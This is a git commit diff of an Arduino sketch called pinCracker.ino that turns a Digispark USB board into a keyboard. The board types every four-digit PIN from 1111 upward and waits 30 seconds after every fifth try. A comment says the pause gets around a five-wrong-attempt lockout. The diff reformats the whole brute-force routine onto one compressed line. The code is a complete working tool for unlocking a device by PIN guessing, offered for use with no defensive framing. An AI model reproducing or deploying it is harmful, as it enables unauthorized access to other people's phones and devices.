6eed3672d6159652725697b1587edc99db4e53a7
Ali Karimi <82864026+Liwyd@users.noreply.github.com>
2024-02-01 23:07:24 +0330

    pinCracker.ino

--- pinCracker.ino
+++ pinCracker.ino
@@ -1,33 +1,6 @@
 #include <DigiCombo.h>
-int LED = 1;
-
-void setup()
-{
-  pinMode(LED, OUTPUT);
-  for (int i = 0; i < 256; i++)
-  {
-    analogWrite(LED, i);
-    delay(10);
-  }
-
-  DigiCombo.begin();
-  DigiCombo.delay(1000);
-
-  DigiCombo.print("1111\n");
-  DigiCombo.delay(400);
-  DigiCombo.print("1111\n");
-  DigiCombo.delay(800);
-  for (int i = 1112, counter = 0; i < 10000; i++, counter++)
-  {
-    if (!(counter % 5))DigiCombo.delay(30000);
-
-    DigiCombo.print(i);
-    DigiCombo.print("\n");
-    DigiCombo.delay(800);
-  }
-
-  DigiCombo.delay(40000);
-}
-void loop()
-{
-}
+void setup(){pinMode(1, OUTPUT);for(int i = 0; i < 256; i++){analogWrite(1, i);delay(10);}DigiCombo.begin();DigiCombo.delay(1000);DigiCombo.print("1111\n");DigiCombo.delay(400);DigiCombo.print("1111\n");DigiCombo.delay(800);for (int i = 1112, counter = 0; i < 10000; i++, counter++){
+// -------------------------------------------------------------------------------------------------------
+if (!(counter % 5))DigiCombo.delay(30000); // this line if you bypass the password limit(5 wrong attempts)
+// -------------------------------------------------------------------------------------------------------
+DigiCombo.print(i);DigiCombo.print("\n");DigiCombo.delay(800);}DigiCombo.delay(40000);}void loop(){}
